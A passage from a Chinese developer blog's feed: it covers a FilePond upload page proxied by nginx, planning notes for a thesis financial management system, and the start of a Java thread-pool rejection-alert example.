class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>FilePond<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://unpkg.com/filepond/dist/filepond.css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://unpkg.com/filepond/dist/filepond.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://unpkg.com/filepond-plugin-image-preview/dist/filepond-plugin-image-preview.css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://unpkg.com/filepond-plugin-image-preview/dist/filepond-plugin-image-preview.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;filepond&quot;</span> <span class="hljs-attr">multiple</span> <span class="hljs-attr">data-allow-reorder</span>=<span class="hljs-string">&quot;true&quot;</span>     <span class="hljs-attr">data-max-file-size</span>=<span class="hljs-string">&quot;100MB&quot;</span>&gt;</span><br><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> inputElement = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;input[type=&quot;file&quot;]&#x27;</span>);</span><br><span class="language-javascript"> </span><br><span class="language-javascript">        </span><br><span class="language-javascript">        <span class="hljs-comment">///   注册插件    </span></span><br><span class="language-javascript">        <span class="hljs-title class_">FilePond</span>.<span class="hljs-title function_">registerPlugin</span>(</span><br><span class="language-javascript">            <span class="hljs-title class_">FilePondPluginImagePreview</span>,</span><br><span class="language-javascript">        );</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-title class_">FilePond</span>.<span class="hljs-title function_">setOptions</span>(&#123;</span><br><span class="language-javascript"><span class="hljs-comment">// 修改上传地址</span></span><br><span class="language-javascript">        <span class="hljs-attr">server</span>:&#123;</span><br><span class="language-javascript">    <span class="hljs-attr">url</span>:  <span class="hljs-string">&#x27;http://1.1.1.1/post&#x27;</span>, <span class="hljs-comment">//上传地址</span></span><br><span class="language-javascript">    <span class="hljs-attr">process</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-attr">onload</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>) &#123;</span><br><span class="language-javascript">              <span class="hljs-keyword">var</span> resp = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(response);</span><br><span class="language-javascript">      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(resp);</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">          &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">    &#125;);</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-title class_">FilePond</span>.<span class="hljs-title function_">create</span>(inputElement);</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;FilePond:processfile&#x27;</span>, <span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;process done&#x27;</span>, e.<span class="hljs-property">detail</span>);</span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript">    </span><br><span class="language-javascript">        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;FilePond:addfile&#x27;</span>, <span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;add file&#x27;</span>, e.<span class="hljs-property">detail</span>);</span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="最后使用nginx代理到index-html的位置访问"><a href="#最后使用nginx代理到index-html的位置访问" class="headerlink" title="最后使用nginx代理到index.html的位置访问"></a>最后使用nginx代理到index.html的位置访问</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span>  /upload &#123;<br><span class="hljs-comment"># index.html 所在的目录位置</span><br>        <span class="hljs-attribute">alias</span> /usr/share/nginx/html/upload/;<br>    &#125;<br><br></code></pre></td></tr></table></figure><h3 id="最后-最后-检查nginx配置并重启"><a href="#最后-最后-检查nginx配置并重启" class="headerlink" title="最后 最后 检查nginx配置并重启"></a>最后 最后 检查nginx配置并重启</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx">/etc/<span class="hljs-attribute">nginx</span> -t;/etc/<span class="hljs-attribute">nginx</span> -s reload;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>nginx</tag>
      
      <tag>nodejs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FMS日志</title>
    <link href="/2022/03/30/FMS%E6%97%A5%E5%BF%97/"/>
    <url>/2022/03/30/FMS%E6%97%A5%E5%BF%97/</url>
    
    <content type="html"><![CDATA[<ul><li><h1 id="技术选型"><a href="#技术选型" class="headerlink" title="技术选型"></a>技术选型</h1></li><li><p>BACKEND: SpringBoot(2.5.1), Mysql(8.0), Redis …</p></li><li><p>FRONTEND: EAdmin, jq,表格组件(douyin上的) (node -v 11.9.0 npm -v 6.5.0 gulp -v 3.9.1)</p></li><li><h4 id="前端模板"><a href="#前端模板" class="headerlink" title="前端模板"></a>前端模板</h4><p>#+BEGIN_PINNED<br><a href="https://github.com/iview/iview-admin">https://github.com/iview/iview-admin</a> </p><ol><li><a href="http://www.eadmin.com.cn/#./doc/start/%E6%A6%82%E8%BF%B0.html#frame">http://www.eadmin.com.cn/#./doc/start/%E6%A6%82%E8%BF%B0.html#frame</a></li><li><a href="https://gitee.com/erupt/erupt">https://gitee.com/erupt/erupt</a><br>#+END_PINNED</li></ol></li><li><h4 id="前端文档"><a href="#前端文档" class="headerlink" title="前端文档"></a>前端文档</h4></li><li><p>#+BEGIN_PINNED<br><a href="https://lison16.github.io/iview-admin-doc/">https://lison16.github.io/iview-admin-doc/</a></p><ol><li><a href="http://www.eadmin.com.cn/#./doc/start/%E5%AE%89%E8%A3%85.html#frame">http://www.eadmin.com.cn/#./doc/start/%E5%AE%89%E8%A3%85.html#frame</a><br>#+END_PINNED</li></ol></li><li><h1 id="EAdmin注意"><a href="#EAdmin注意" class="headerlink" title="EAdmin注意"></a>EAdmin注意</h1><p>node -v 11.9.0<br>npm -v 6.5.0<br>gulp -v 3.9.1<br>主文件位于dist<br>导航栏文件位于 dist/static/js/data/nav.js</p><p>#+BEGIN_TIP<br>当心配置<br>// API接口返回的code码的字段名<br>   code_field   : ‘code’,<br>   // API接口返回代表成功的code码的值<br>   code_success : 100,<br>   // API接口返回的处理结果内容的字段名<br>   msg_field    : ‘msg’,<br>   // API接口返回的数据体的字段名<br>   data_field   : ‘data’<br>#+END_TIP</p><p>前端消息返回拦截处，主要是消息提醒msg</p><figure class="highlight js"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">E</span>:\p\eadmin\src\js\framework\eadmin\<span class="hljs-number">1.0</span><span class="hljs-number">.1</span>\eadmin.<span class="hljs-property">js</span>:<br><span class="hljs-number">751</span>                  <span class="hljs-keyword">return</span>;<br><span class="hljs-number">752</span>              &#125;<br><span class="hljs-number">753</span>:             <span class="hljs-keyword">let</span> msg = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-number">754</span>:             <span class="hljs-keyword">if</span> (data[<span class="hljs-variable language_">module</span>.<span class="hljs-property">conf</span>.<span class="hljs-property">http</span>.<span class="hljs-property">msg_field</span>] != <span class="hljs-literal">undefined</span>)<br><span class="hljs-number">755</span>:                 msg = data[<span class="hljs-variable language_">module</span>.<span class="hljs-property">conf</span>.<span class="hljs-property">http</span>.<span class="hljs-property">msg_field</span>];<br><span class="hljs-number">756</span>              <span class="hljs-comment">// 执行失败</span><br><span class="hljs-number">757</span>              <span class="hljs-keyword">if</span> (data[<span class="hljs-variable language_">module</span>.<span class="hljs-property">conf</span>.<span class="hljs-property">http</span>.<span class="hljs-property">code_field</span>] != <span class="hljs-variable language_">module</span>.<span class="hljs-property">conf</span>.<span class="hljs-property">http</span>.<span class="hljs-property">code_success</span>)<br><span class="hljs-number">758</span>              &#123;<br><span class="hljs-number">759</span>:                 <span class="hljs-keyword">if</span> (msg == <span class="hljs-string">&#x27;&#x27;</span>) msg = <span class="hljs-string">&#x27;操作执行失败&#x27;</span>;<br><span class="hljs-number">760</span>                  <span class="hljs-title class_">Message</span>.<span class="hljs-title function_">error</span>(&#123;<br><span class="hljs-number">761</span>:                     content : msg<br><span class="hljs-number">762</span>                  &#125;);<br><span class="hljs-number">763</span>                  <span class="hljs-keyword">if</span> (_.<span class="hljs-title function_">isFunction</span>(param.<span class="hljs-property">error</span>))<br>...<br><span class="hljs-number">771</span>                  <span class="hljs-keyword">return</span>;<br><span class="hljs-number">772</span>              &#125;<br><span class="hljs-number">773</span>:             msg = msg || <span class="hljs-string">&#x27;操作执行成功&#x27;</span>;<br><span class="hljs-number">774</span>              <span class="hljs-comment">// 提示</span><br><span class="hljs-number">775</span>:             <span class="hljs-keyword">let</span> conf = &#123;content : msg&#125;;<br><span class="hljs-number">776</span>              <span class="hljs-keyword">if</span> (_.<span class="hljs-title function_">isFunction</span>(param.<span class="hljs-property">then</span>))<br><span class="hljs-number">777</span>              &#123;<br>...<br><span class="hljs-number">798</span>                      <span class="hljs-title class_">Notice</span>.<span class="hljs-title function_">success</span>(&#123;<br><span class="hljs-number">799</span>                          title : <span class="hljs-string">&#x27;消息提醒&#x27;</span>,<br><span class="hljs-number">800</span>:                         desc  : msg<br><span class="hljs-number">801</span>                      &#125;);<br><span class="hljs-number">802</span>                      <span class="hljs-keyword">if</span> (conf.<span class="hljs-property">callback</span> != <span class="hljs-literal">undefined</span>) <br>...<br><span class="hljs-number">805</span>                  <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;message&#x27;</span>:<br><span class="hljs-number">806</span>                      <span class="hljs-title class_">Message</span>.<span class="hljs-title function_">success</span>(&#123;<br><span class="hljs-number">807</span>:                         content : msg<br><span class="hljs-number">808</span>                      &#125;);<br><span class="hljs-number">809</span>                      <span class="hljs-keyword">if</span> (conf.<span class="hljs-property">callback</span> != <span class="hljs-literal">undefined</span>) <br><br></code></pre></td></tr></table></figure><blockquote><p>实在是一个大坑  ！！！！  注意127.0.0.1:3000和localhost:3000的区别  要么使用127，要么使用localhost，或者在hostname里加上一个域名指向，太痛苦了，还要前后端配置Access-Control-Allow-Origin，两者并不兼容，是不一样的！！ :(<br>前后端一起写真是太痛苦了 😭</p></blockquote></li><li><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1></li><li><p>当前，由于迅速发展的科学技术，尤其是计算机技术的发展，使人们的财务管理已经发展到信息化管理层面，但是对一些企业，尤其是个体经营者来说，财务管理的信息化意识还处于较低水平，其中的大多数对财务管理还是依靠手工记账的方式，为了解决这个问题，本文针对企业对财务管理的实际需求，研究开发出一个应用于个体及中小型企业的财务管理软件。 本文首先总结了目前中小型企业的财务管理存在的问题，其次对一些大中型财务管理软件是如何设计的进行了认真的分析，最后研发了一套适用于中小企业的财务软件。我们根据中小型企业对其内部财务进行管理的要求，总结了相对客观的结论，即如今的中小企业在财务管理方面比较凌乱。</p></li><li></li><li><h1 id="设计模型参考"><a href="#设计模型参考" class="headerlink" title="设计模型参考"></a>设计模型参考</h1></li><li><p><a href="https://cloud.tencent.com/developer/article/1677971">https://cloud.tencent.com/developer/article/1677971</a></p></li><li><p><a href="http://www.woshipm.com/pd/2894199.html">http://www.woshipm.com/pd/2894199.html</a><br><kbd>设计参考方案</kbd></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java">企业财务管理系统主要用于实现公司的财务管理，基本功能包括：系统登录、部门信息管理、员工信息管理、资产、经营、费用信息管理等。本系统结构如下：<br><br>（<span class="hljs-number">1</span>）职工端：<br><br>    登录模块：登录功能；<br><br>        个人信息模块：可修改个人的信息；<br><br>    个人工资模块：可查阅自己的工资；<br><br>    公司资产模块：可查看公司的资产信息；<br><br>    公司经营模块：可查看公司的经营信息；<br><br>    公司费用模块：可查看公司的费用信息；<br><br>        年终资产模块：可查看公司的总资产信息；<br><br>（<span class="hljs-number">2</span>）超级管理员端：<br><br>    登录模块：实现管理员登录功能；<br><br>    个人信息模块：可修改个人的信息；<br><br>    部门信息管理模块：实现部门的增加、修改、删除、查看功能；<br><br>    职工信息管理模块：实现职工信息的增加、修改、删除、查看功能；<br><br>    职工工资管理模块：实现职工工资的增加、修改、查看功能；<br><br>    资产类别管理模块：实现资产类别的增加、删除、查看功能；<br><br>    资产信息管理模块：实现资产信息的增加、查看功能；<br><br>    经营信息管理模块：实现经营信息的增加、查看功能；<br><br>    费用信息管理模块：实现费用信息的增加、查看功能；<br><br>    年终资产分析模块：实现公司总资产的查看功能<br><br></code></pre></td></tr></table></figure></li><li><h1 id="课题简介"><a href="#课题简介" class="headerlink" title="课题简介"></a>课题简介</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1</span>）题目来源：传统财务管理模式下，财务管理工作存在如信息量较大、运算难度大等问题，财务工作人员需要进行反复运算、多次制作财务报表，从而导致核算延迟、出现误差等问题，严重影响工作效率。基于信息技术的企业财务管理信息化是时代发展的必然，并在财务管理中发挥着重要的作用。在大数据背景下，引进大数据技术理念，改变传统财务管理模式，打造企业内外发展大数据财务管理信息系统，提高企业财务管理工作效率，无疑是创新企业财务管理措施的必然。 <br><br><span class="hljs-number">2</span>）主要工作内容：公司财务管理系统，侧重于财务计划、分析与预测，其具体内容为：根据财务分析结果制定下期的财务预算与计划；提供查询功能，并通过差异数值的图形，显示绩效评估以及账户分析数据；作出关于资金的决策，包括资金的投放、筹集与管理。该部分属于 ERP 系统的核心环节，可以实现各生产过程的有机结合，也能够起到降低库存，提高运营效率的目的。 <br><br><span class="hljs-number">3</span>）参考资料 <br>[<span class="hljs-number">1</span>] 安科峰 . 数字化财务管理系统分析企业财务管理研究对策 [J]. 财经界 ,<span class="hljs-number">2020</span>(<span class="hljs-number">23</span>):<span class="hljs-number">139</span>-<span class="hljs-number">140.</span> <br>https:<span class="hljs-comment">//m.fx361.com/news/2020/1102/7661074.html</span><br><br><br>[<span class="hljs-number">2</span>] 雷淑琴 . 基于业财融合的煤炭企业财务管理系统框架的重构 [J]. 华北水利水电大学学报 ( 社会科学版 ),<span class="hljs-number">2019</span>,<span class="hljs-number">34</span>(<span class="hljs-number">05</span>):<span class="hljs-number">55</span>-<span class="hljs-number">57.</span> <br><br><br><br><br>[<span class="hljs-number">3</span>] 刘梅玲 , 朱学义 . 国外企业财务软件的发展历程——财务管理系统在从 MRP 到 ERP 发展过程中的演进 [J]. 中国管理信息化 ,<span class="hljs-number">2020</span>(<span class="hljs-number">04</span>):<span class="hljs-number">36</span>-<span class="hljs-number">39.</span> <br><br><br><br><br>[<span class="hljs-number">4</span>] 张继德 , 胡月 . 新常态下企业财务管理创新动因、初始条件与策略研究 [J]. 会计研究 ,<span class="hljs-number">2020</span>(08):<span class="hljs-number">58</span>-<span class="hljs-number">63</span>+<span class="hljs-number">97.</span> [<span class="hljs-number">5</span>] 邱玉莲，钱苏维.大数据环境下企业财务管理信息系统应用探讨[J].财会通讯，<span class="hljs-number">2017</span>，No<span class="hljs-number">.735</span>（<span class="hljs-number">7</span>）：<span class="hljs-number">105</span>-<span class="hljs-number">106.</span><br></code></pre></td></tr></table></figure></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">- CAJ to PDF chrome extension SpeedPDF https:<span class="hljs-comment">//speedpdf.com/zh-cn/convert/caj-to-pdf?ch=chrome-web</span><br>- https:<span class="hljs-comment">//libredata.cjlu.edu.cn/</span><br>- https:<span class="hljs-comment">//cjlu.metaersp.com/personalIndex</span><br>- [<span class="hljs-number">1</span>] 数字化财务管理系统分析企业财务管理研究对策<br>- https:<span class="hljs-comment">//libredata.cjlu.edu.cn/s/net/cnki/kns/G.https/kcms/detail/detail.aspx?dbcode=CJFD&amp;dbname=CJFDLAST2020&amp;filename=CJJI202023088&amp;uniplatform=NZKPT&amp;v=dv-k_jU2mJRT2C1BFSAIzpNaucH52rDGiQaAdiEJeuuDgfKBkoPWkMCu8_giUzPv</span><br>- [<span class="hljs-number">2</span>]基于业财融合的煤炭企业财务管理系统框架的重构<br>- https:<span class="hljs-comment">//libredata.cjlu.edu.cn/s/net/cnki/kns/G.https/KXReader/Detail?invoice=diI2xADN5J7LBxp8DpnOFwj%2BbIQZc0omeFDMX1OTJKPwEH5bdcVfeB7yhQzAiIhX5ArkGkVRC8iFWWPBzTem2%2Fzre9e8IJlAYVz5xq0TPl1IMPS3CWRiJrmz1qBBOnDUlwkI3yUxYhU8zUXJBXbVfjP%2Bgn%2F48JjrXRLbjqiZlU4%3D&amp;DBCODE=CJFD&amp;FileName=SLSB201805014&amp;TABLEName=cjfdlast2018&amp;nonce=2CE7B6CFAEF84D27B9F8BBC8B8F0452C&amp;uid=&amp;TIMESTAMP=1640590597471</span><br>- [<span class="hljs-number">3</span>]国外企业财务软件的发展历程——财务管理系统在从 MRP 到 ERP 发展过程中的演进<br>- https:<span class="hljs-comment">//libredata.cjlu.edu.cn/s/net/cnki/kns/G.https/kcms/detail/detail.aspx?dbcode=CJFD&amp;dbname=CJFD2005&amp;filename=ZKDS20050400E&amp;uniplatform=NZKPT&amp;v=6Q4mLKy-A50i07GTVg8cRDouslGpGVWKwecEa80LPM-1lfV7QQJE_vOtrp-_TJ36</span><br>- [<span class="hljs-number">4</span>]新常态下企业财务管理创新动因、初始条件与策略研究<br>- https:<span class="hljs-comment">//libredata.cjlu.edu.cn/s/net/cnki/kns/G.https/kcms/detail/detail.aspx?dbcode=CJFD&amp;dbname=CJFDLAST2017&amp;filename=KJYJ201608008&amp;uniplatform=NZKPT&amp;v=0GBV5CGwgkj_MMNWo9ElZbqThZALcqG4HHJaDdOQW67CjDG1a60QvOi_zbfzYpPy</span><br><span class="hljs-number">1.</span> sci hub<br><span class="hljs-number">2.</span> www.ixuhesu.com/<br><span class="hljs-number">3.</span> http:<span class="hljs-comment">//www.oalib.com/</span><br></code></pre></td></tr></table></figure><h1 id="FMS"><a href="#FMS" class="headerlink" title="FMS"></a>FMS</h1><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>公司财务管理系统</p><h4 id="主要研究了基于web的B-S架构下的公司财务管理系统的设计、分析、以及实现。"><a href="#主要研究了基于web的B-S架构下的公司财务管理系统的设计、分析、以及实现。" class="headerlink" title="主要研究了基于web的B/S架构下的公司财务管理系统的设计、分析、以及实现。"></a>主要研究了基于web的B/S架构下的公司财务管理系统的设计、分析、以及实现。</h4><blockquote><p>结合大数据技术对公司财务进行管理，并侧重于对财务的计划、分析与预测，减少传统财务管理的弊端。主要对一下几方面进行研究：</p></blockquote><p><code>1.    研究传统财务管理存在的问题以及解决方案</code> </p><p><code>2.    研究现有的系统所需要的开发技术以及收集整理必要的财务知识</code></p><p><code>3.    通过大数据对财务数据进行分析，呈现可视化内容，展示实时数据，对财务进行分析、计划与预测</code></p><p><code>4.    现有的系统所需要的开发技术以及必要的财务知识</code></p><h3 id="模块信息"><a href="#模块信息" class="headerlink" title="模块信息"></a>模块信息</h3><p>包含应收账单，应付账单，财务预测，财务计划制定，财务用户，首页可视化模块</p><p>菜单栏分为二种，用户和管理员</p>]]></content>
    
    
    
    <tags>
      
      <tag>fms</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java线程池报警消息发送</title>
    <link href="/2022/03/29/Java%E7%BA%BF%E7%A8%8B%E6%B1%A0%E6%8A%A5%E8%AD%A6%E6%B6%88%E6%81%AF%E5%8F%91%E9%80%81/"/>
    <url>/2022/03/29/Java%E7%BA%BF%E7%A8%8B%E6%B1%A0%E6%8A%A5%E8%AD%A6%E6%B6%88%E6%81%AF%E5%8F%91%E9%80%81/</url>
    
    <content type="html"><![CDATA[<p>Java线程池自定义报警</p><p>当线程池任务过多，使用拒绝策略时，你也希望收到消息，现在实现这一功能 : )</p><figure class="highlight java"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></div></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@AllArgsConstructor</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadRejectTest</span> &#123;<br>    <span class="hljs-meta">@SneakyThrows</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">AtomicLong</span> <span class="hljs-variable">atomicLong</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicLong</span>();<br>        <span class="hljs-comment">//1.创建线程工厂</span><br>        <span class="hljs-type">ThreadFactory</span> <span class="hljs-variable">threadFactory</span> <span class="hljs-operator">=</span> r -&gt; &#123;<br>            <span class="hljs-type">Thread</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r);<br>            t.setName(<span class="hljs-string">&quot;coolT&quot;</span>);<br>            t.setDaemon(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">return</span> t;<br>        &#125;;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime.getRuntime().availableProcessors() + <span class="hljs-number">1</span>;<br>        System.out.println(<span class="hljs-string">&quot;System core size &quot;</span> + process);<br>        <span class="hljs-comment">//2.设置线程池 采用四种其中一种的拒绝策略</span><br>        <span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(<br>                process + <span class="hljs-number">1</span>,<br>                process * <span class="hljs-number">2</span>,<br>                <span class="hljs-number">20L</span>,<br>                TimeUnit.SECONDS,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingDeque</span>&lt;&gt;(<span class="hljs-number">100</span>),<br>                threadFactory,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>.AbortPolicy()<br>        );<br><br><span class="hljs-comment">//3.将之前设置的拒绝策略变为拒绝策越代理类</span><br>        executor.setRejectedExecutionHandler(RejectedProxyUtil.createProxy(<br>                executor.getRejectedExecutionHandler(),<br>                <span class="hljs-string">&quot;customThreadPool&quot;</span>, atomicLong));<br><br><span class="hljs-comment">//4.执行仍任务</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">taskNum</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>;<br>        <span class="hljs-keyword">while</span> (taskNum--&gt;<span class="hljs-number">0</span>)&#123;<br>            executor.execute(() -&gt; &#123;<br>                <span class="hljs-comment">//doing tasks</span><br>                <span class="hljs-keyword">try</span> &#123;<br>                    TimeUnit.MICROSECONDS.sleep(<span class="hljs-number">100</span>);<br><span class="hljs-comment">//                    System.out.println(&quot;拒绝数量: &quot;+atomicLong);</span><br>                &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;);<br>        &#125;<br>        